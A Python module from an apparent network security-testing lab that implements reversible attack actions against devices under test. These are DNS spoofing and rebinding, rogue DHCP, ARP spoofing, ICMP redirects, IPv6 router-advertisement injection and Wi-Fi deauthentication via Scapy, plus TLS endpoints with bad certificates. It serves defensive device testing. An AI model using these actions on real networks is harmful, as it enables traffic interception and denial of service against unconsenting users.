"""Reversible adversarial network actions.

Every action is reversible and records what it did. ``ServiceBackedActionRunner`` uses the
lab services and (where available) Scapy for frame injection; ``FakeActionRunner`` is a
deterministic in-memory implementation used by unit/integration tests and dry runs.
"""

from __future__ import annotations

import socket
import threading
import time
from abc import ABC, abstractmethod
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import UTC
from typing import Any

from ..core.results import Observation
from ..errors import PlatformError
from ..logging_config import get_logger

logger = get_logger(__name__)


@dataclass
class ActionResult:
    action: str
    success: bool
    details: dict[str, Any] = field(default_factory=dict)
    observations: list[Observation] = field(default_factory=list)
    error: str | None = None

    def observe(self, source: str, kind: str, summary: str, **details: Any) -> None:
        from datetime import datetime

        self.observations.append(
            Observation(
                source=source,
                kind=kind,
                timestamp=datetime.now(UTC),
                summary=summary,
                details=details,
            )
        )


class SinkHandle:
    """A lab-side listener used to prove that traffic actually arrived."""

    def __init__(self, protocol: str, port: int, host: str = "0.0.0.0") -> None:
        self.protocol = protocol
        self.port = port
        self.host = host
        self.hits: list[dict[str, Any]] = []
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._sock: socket.socket | None = None

    def start(self) -> None:
        if self.protocol == "tcp":
            self._start_tcp()
        elif self.protocol == "udp":
            self._start_udp()

    def _start_tcp(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(8)
        sock.settimeout(0.5)
        self._sock = sock

        def loop() -> None:
            while not self._stop.is_set():
                try:
                    conn, addr = sock.accept()
                except TimeoutError:
                    continue
                except OSError:
                    break
                self.hits.append({"client": addr[0], "port": addr[1], "at": time.time()})
                try:
                    conn.settimeout(0.5)
                    conn.recv(4096)
                except OSError:
                    pass
                conn.close()

        self._thread = threading.Thread(target=loop, daemon=True, name=f"sink-tcp-{self.port}")
        self._thread.start()

    def _start_udp(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.settimeout(0.5)
        self._sock = sock

        def loop() -> None:
            while not self._stop.is_set():
                try:
                    data, addr = sock.recvfrom(65535)
                except TimeoutError:
                    continue
                except OSError:
                    break
                self.hits.append({"client": addr[0], "port": addr[1], "len": len(data), "at": time.time()})

        self._thread = threading.Thread(target=loop, daemon=True, name=f"sink-udp-{self.port}")
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread:
            self._thread.join(timeout=2.0)

    @property
    def hit_count(self) -> int:
        return len(self.hits)


class LabActionRunner(ABC):
    """Interface used by test modules."""

    @abstractmethod
    def perform(self, action: str, **params: Any) -> ActionResult: ...

    @abstractmethod
    def revert_all(self) -> None: ...

    def status(self) -> dict[str, Any]:
        return {}


class ServiceBackedActionRunner(LabActionRunner):
    """Runs actions against live lab services and (optionally) Scapy injection."""

    def __init__(
        self,
        *,
        dns_server: Any | None = None,
        dhcp_server: Any | None = None,
        gateway: Any | None = None,
        bus: Callable[..., None] | None = None,
        session_id: str = "",
        device_id: str | None = None,
        interface: str | None = None,
        evidence: Any | None = None,
        test_id: str | None = None,
        scenario_id: str | None = None,
    ) -> None:
        self.dns_server = dns_server
        self.dhcp_server = dhcp_server
        self.gateway = gateway
        self.bus = bus
        self.session_id = session_id
        self.device_id = device_id
        self.interface = interface
        # Laboratory evidence store and correlation ids, set per test by the orchestrator.
        self.evidence = evidence
        self.test_id = test_id
        self.scenario_id = scenario_id
        self._sinks: dict[str, SinkHandle] = {}
        self._tls_servers: list[Any] = []
        self._http_servers: dict[int, Any] = {}
        self._applied: list[tuple[str, dict[str, Any]]] = []
        self._scapy = None

    # ------------------------------------------------------------------
    def _injector(self):
        if self._scapy is None:
            try:
                from scapy.all import send, sendp  # type: ignore

                self._scapy = (send, sendp)
            except Exception as exc:
                raise PlatformError(f"Scapy injection unavailable: {exc}") from exc
        return self._scapy

    def _record(self, action: str, params: dict[str, Any], result: ActionResult) -> None:
        if result.success:
            self._applied.append((action, dict(params)))

    def perform(self, action: str, **params: Any) -> ActionResult:
        try:
            handler = getattr(self, f"_do_{action}")
        except AttributeError:
            return ActionResult(action, False, error=f"unknown action {action!r}")
        try:
            result = handler(**params)
        except Exception as exc:
            logger.exception("action %s failed", action)
            return ActionResult(action, False, error=str(exc))
        self._record(action, params, result)
        return result

    # ------------------------------------------------------------------
    # DNS
    # ------------------------------------------------------------------
    def _do_dns_spoof(self, qname: str, answer: str, ttl: int = 10) -> ActionResult:
        if self.dns_server is None:
            return ActionResult("dns_spoof", False, error="DNS server not configured")

        def responder(question, _query):
            if question.name.rstrip(".").lower() == qname.rstrip(".").lower():
                return [_a_record(question.name, answer, ttl)]
            return None

        self.dns_server.config.responder = responder
        result = ActionResult("dns_spoof", True, {"qname": qname, "answer": answer, "ttl": ttl})
        result.observe("lab", "dns_spoof_applied", f"spoof {qname} -> {answer}", qname=qname, answer=answer)
        return result

    def _do_dns_rebind(self, qname: str, public_ip: str, private_ip: str) -> ActionResult:
        if self.dns_server is None:
            return ActionResult("dns_rebind", False, error="DNS server not configured")
        counter = {"n": 0}

        def responder(question, _query):
            if question.name.rstrip(".").lower() == qname.rstrip(".").lower():
                counter["n"] += 1
                return [_a_record(question.name, public_ip if counter["n"] == 1 else private_ip, 0)]
            return None

        self.dns_server.config.responder = responder
        result = ActionResult("dns_rebind", True, {"qname": qname, "public": public_ip, "private": private_ip})
        result.observe("lab", "dns_rebind_applied", f"rebind {qname}", qname=qname)
        return result

    def _do_dns_cname(self, qname: str, target: str, ttl: int = 0) -> ActionResult:
        if self.dns_server is None:
            return ActionResult("dns_cname", False, error="DNS server not configured")

        def responder(question, _query):
            if question.name.rstrip(".").lower() == qname.rstrip(".").lower():
                from ..protocols import dns

                return [dns.cname_record(question.name, target, ttl)]
            return None

        self.dns_server.config.responder = responder
        result = ActionResult("dns_cname", True, {"qname": qname, "target": target})
        result.observe("lab", "dns_cname_applied", f"CNAME {qname} -> {target}")
        return result

    def _do_dns_policy(self, qname: str, policy: str) -> ActionResult:
        if self.dns_server is None:
            return ActionResult("dns_policy", False, error="DNS server not configured")
        name = qname.rstrip(".").lower()
        if policy == "drop":
            self.dns_server.config.drop_names.add(name)
        elif policy == "refuse":
            self.dns_server.config.refuse_names.add(name)
        elif policy == "nxdomain":
            self.dns_server.config.nxdomain_names.add(name)
        else:
            return ActionResult("dns_policy", False, error=f"unknown policy {policy!r}")
        result = ActionResult("dns_policy", True, {"qname": qname, "policy": policy})
        result.observe("lab", "dns_policy_applied", f"{policy} {qname}", qname=qname, policy=policy)
        return result

    # ------------------------------------------------------------------
    # DHCP
    # ------------------------------------------------------------------
    def _do_dhcp_rogue(self, router: str, dns_servers: list[str], subnet_mask: str = "255.255.255.0") -> ActionResult:
        if self.dhcp_server is None:
            return ActionResult("dhcp_rogue", False, error="DHCP server not configured")
        self.dhcp_server.config.router = router
        self.dhcp_server.config.dns_servers = list(dns_servers)
        self.dhcp_server.config.subnet_mask = subnet_mask
        result = ActionResult("dhcp_rogue", True, {"router": router, "dns_servers": dns_servers})
        result.observe("lab", "dhcp_rogue_applied", f"rogue DHCP router={router} dns={dns_servers}")
        return result

    # ------------------------------------------------------------------
    # L2/L3 injection (Scapy, hardware-gated)
    # ------------------------------------------------------------------
    def _do_arp_spoof(self, target_ip: str, spoof_ip: str, count: int = 20) -> ActionResult:
        send, _ = self._injector()
        try:
            from scapy.all import ARP  # type: ignore

            packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
            send(packet, count=count, inter=0.1, verbose=False, iface=self.interface)
        except Exception as exc:
            return ActionResult("arp_spoof", False, error=str(exc))
        result = ActionResult("arp_spoof", True, {"target": target_ip, "spoof": spoof_ip, "count": count})
        result.observe("lab", "arp_spoof_applied", f"ARP spoof {target_ip} -> {spoof_ip}")
        return result

    def _do_icmp_redirect(self, target_ip: str, fake_gateway: str, gateway_ip: str) -> ActionResult:
        send, _ = self._injector()
        try:
            from scapy.all import ICMP, IP  # type: ignore

            packet = IP(src=gateway_ip, dst=target_ip) / ICMP(
                type=5, code=1, gw=fake_gateway
            ) / IP(src=target_ip, dst="0.0.0.0") / b""
            send(packet, count=3, verbose=False, iface=self.interface)
        except Exception as exc:
            return ActionResult("icmp_redirect", False, error=str(exc))
        result = ActionResult("icmp_redirect", True, {"target": target_ip, "fake_gateway": fake_gateway})
        result.observe("lab", "icmp_redirect_applied", f"ICMP redirect {target_ip} -> {fake_gateway}")
        return result

    def _do_ra_inject(self, prefix: str, gateway: str, interface: str | None = None) -> ActionResult:
        _, sendp = self._injector()
        try:
            from scapy.all import Ether, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, IPv6  # type: ignore

            iface = interface or self.interface
            packet = (
                Ether(src="02:00:00:00:00:01", dst="33:33:00:00:00:01")
                / IPv6(src=gateway, dst="ff02::1")
                / ICMPv6ND_RA()
                / ICMPv6NDOptPrefixInfo(prefix=prefix.split("/")[0], prefixlen=int(prefix.split("/")[1]))
            )
            sendp(packet, count=3, inter=0.2, verbose=False, iface=iface)
        except Exception as exc:
            return ActionResult("ra_inject", False, error=str(exc))
        result = ActionResult("ra_inject", True, {"prefix": prefix, "gateway": gateway})
        result.observe("lab", "ra_inject_applied", f"RA {prefix} via {gateway}")
        return result

    def _do_deauth(self, client_mac: str, ap_mac: str, count: int = 10, reason: int = 7) -> ActionResult:
        _, sendp = self._injector()
        try:
            from scapy.all import Dot11, Dot11Deauth, RadioTap  # type: ignore

            packet = (
                RadioTap()
                / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
                / Dot11Deauth(reason=reason)
            )
            sendp(packet, count=count, inter=0.1, verbose=False, iface=self.interface)
        except Exception as exc:
            return ActionResult("deauth", False, error=str(exc))
        result = ActionResult("deauth", True, {"client": client_mac, "ap": ap_mac, "count": count})
        result.observe("lab", "deauth_applied", f"deauth {count} frames {client_mac} <- {ap_mac}")
        return result

    # ------------------------------------------------------------------
    # Lab endpoints
    # ------------------------------------------------------------------
    def _do_start_sink(self, protocol: str, port: int, name: str = "") -> ActionResult:
        key = name or f"{protocol}:{port}"
        if key in self._sinks:
            return ActionResult("start_sink", True, {"key": key, "reused": True})
        handle = SinkHandle(protocol, port)
        handle.start()
        self._sinks[key] = handle
        return ActionResult("start_sink", True, {"key": key, "protocol": protocol, "port": port})

    def _do_stop_sink(self, name: str) -> ActionResult:
        handle = self._sinks.pop(name, None)
        if handle is None:
            return ActionResult("stop_sink", False, error=f"unknown sink {name!r}")
        handle.stop()
        return ActionResult("stop_sink", True, {"key": name, "hits": handle.hit_count})

    def _do_start_tls(
        self,
        hostname: str,
        port: int = 8443,
        cert_mode: str = "lab_ca",
        bind_addr: str = "0.0.0.0",
        alpn: list[str] | None = None,
        minimum_version: str | None = None,
    ) -> ActionResult:
        try:
            import ssl

            from ..services.certificates import CertificateAuthority
            from ..services.tls_server import TlsLabServer
        except Exception as exc:
            return ActionResult("start_tls", False, error=f"TLS server unavailable: {exc}")
        ca = CertificateAuthority()
        if not ca.available:
            return ActionResult("start_tls", False, error="LAB_CA unavailable: cryptography not installed")
        if cert_mode == "self_signed":
            bundle = ca.self_signed(hostname)
        elif cert_mode == "wrong_hostname":
            bundle = ca.issue([hostname], wrong_hostname="wrong.lab.test")
        elif cert_mode == "expired":
            bundle = ca.issue([hostname], expired=True)
        else:
            bundle = ca.issue([hostname])
        min_version = None
        if minimum_version:
            min_version = {
                "TLSv1": ssl.TLSVersion.TLSv1,
                "TLSv1.1": ssl.TLSVersion.TLSv1_1,
                "TLSv1.2": ssl.TLSVersion.TLSv1_2,
                "TLSv1.3": ssl.TLSVersion.TLSv1_3,
            }.get(minimum_version)
        server = TlsLabServer(
            bundle, bind_addr=bind_addr, port=port, alpn=alpn,
            minimum_version=min_version, bus=self.bus,
            session_id=self.session_id, device_id=self.device_id,
        )
        try:
            server.start()
        except OSError as exc:
            return ActionResult("start_tls", False, error=f"cannot bind TLS port {port}: {exc}")
        self._tls_servers.append(server)
        result = ActionResult("start_tls", True, {
            "hostname": hostname, "port": port, "cert_mode": cert_mode,
            "fingerprint": bundle.fingerprint_sha256,
        })
        result.observe("lab", "tls_endpoint_applied",
                       f"TLS endpoint {hostname}:{port} mode={cert_mode}")
        return result

    def _do_start_http(
        self,
        host: str,
        path: str = "/",
        body: str = "",
        port: int = 8080,
        status: int = 200,
        bind_addr: str = "0.0.0.0",
        cookies: list[dict[str, Any]] | None = None,
        redirect_to: str = "",
        headers: dict[str, str] | None = None,
    ) -> ActionResult:
        try:
            from ..services.http_server import CookieRouteConfig, LabHttpServer
        except Exception as exc:
            return ActionResult("start_http", False, error=f"HTTP server unavailable: {exc}")
        server = self._http_servers.get(port)
        if server is None:
            server = LabHttpServer(
                bind_addr=bind_addr, port=port, bus=self.bus,
                session_id=self.session_id, device_id=self.device_id,
                evidence=self.evidence, test_id=self.test_id, scenario_id=self.scenario_id,
            )
            try:
                server.start()
            except OSError as exc:
                return ActionResult("start_http", False, error=f"cannot bind HTTP port {port}: {exc}")
            self._http_servers[port] = server
        route_headers = dict(headers or {})
        if redirect_to:
            route_headers["Location"] = redirect_to
        cookie_configs = [
            CookieRouteConfig(
                name=str(c.get("name", "")),
                value=str(c.get("value", "")),
                secure=bool(c.get("secure", False)),
                httponly=bool(c.get("httponly", False)),
                samesite=str(c.get("samesite", "")),
                max_age=c.get("max_age"),
                path=str(c.get("path", "/")),
                purpose=str(c.get("purpose", "synthetic test cookie")),
            )
            for c in (cookies or [])
        ]
        if cookie_configs or route_headers:
            route = server.add_cookie_route(host, path, cookie_configs, body=body, status=status)
            for key, value in route_headers.items():
                route.headers[key] = value
        else:
            server.add_simple_route(host, path=path, body=body, status=status)
        result = ActionResult("start_http", True, {
            "host": host, "path": path, "port": port,
            "cookies": [c.name for c in cookie_configs],
            "redirect_to": redirect_to or None,
        })
        result.observe("lab", "http_endpoint_applied", f"HTTP endpoint {host}{path} on {port}")
        return result

    def _do_blackhole(self, target: str) -> ActionResult:
        if self.gateway is None:
            return ActionResult("blackhole", False, error="gateway controller not configured")
        self.gateway.block_egress("lab", [target])
        return ActionResult("blackhole", True, {"target": target})

    def _do_route(self, destination: str, gateway: str, interface: str | None = None) -> ActionResult:
        if self.gateway is None:
            return ActionResult("route", False, error="gateway controller not configured")
        self.gateway.add_route(destination, gateway, interface)
        return ActionResult("route", True, {"destination": destination, "gateway": gateway})

    # ------------------------------------------------------------------
    def revert_all(self) -> None:
        if self.dns_server is not None:
            self.dns_server.config.responder = None
            self.dns_server.config.drop_names.clear()
            self.dns_server.config.refuse_names.clear()
            self.dns_server.config.nxdomain_names.clear()
        for handle in self._sinks.values():
            handle.stop()
        self._sinks.clear()
        for server in self._tls_servers:
            try:
                server.stop()
            except Exception:
                logger.exception("TLS server stop failed")
        self._tls_servers.clear()
        for server in self._http_servers.values():
            try:
                server.stop()
            except Exception:
                logger.exception("HTTP server stop failed")
        self._http_servers.clear()
        if self.gateway is not None:
            try:
                self.gateway.restore()
            except Exception:
                logger.exception("gateway restore failed")
        self._applied.clear()

    def status(self) -> dict[str, Any]:
        return {
            "applied_actions": [name for name, _ in self._applied],
            "sinks": {key: handle.hit_count for key, handle in self._sinks.items()},
        }


class FakeActionRunner(LabActionRunner):
    """Deterministic runner used by tests and dry runs."""

    def __init__(self, *, fail_actions: set[str] | None = None) -> None:
        self.actions: list[tuple[str, dict[str, Any]]] = []
        self.fail_actions = fail_actions or set()
        self.sinks: dict[str, SinkHandle] = {}

    def perform(self, action: str, **params: Any) -> ActionResult:
        self.actions.append((action, dict(params)))
        if action in self.fail_actions:
            return ActionResult(action, False, error=f"injected failure for {action}")
        result = ActionResult(action, True, {"params": dict(params), "simulated": True})
        result.observe("test_engine", f"{action}_applied", f"simulated {action}", **params)
        if action == "start_sink":
            name = params.get("name") or f"{params.get('protocol')}:{params.get('port')}"
            self.sinks[name] = SinkHandle(params.get("protocol", "tcp"), int(params.get("port", 0)))
        return result

    def revert_all(self) -> None:
        self.actions.clear()
        self.sinks.clear()

    def status(self) -> dict[str, Any]:
        return {"actions": [a for a, _ in self.actions], "sinks": list(self.sinks)}


def _a_record(name: str, address: str, ttl: int):
    from ..protocols import dns

    return dns.a_record(name, address, ttl)
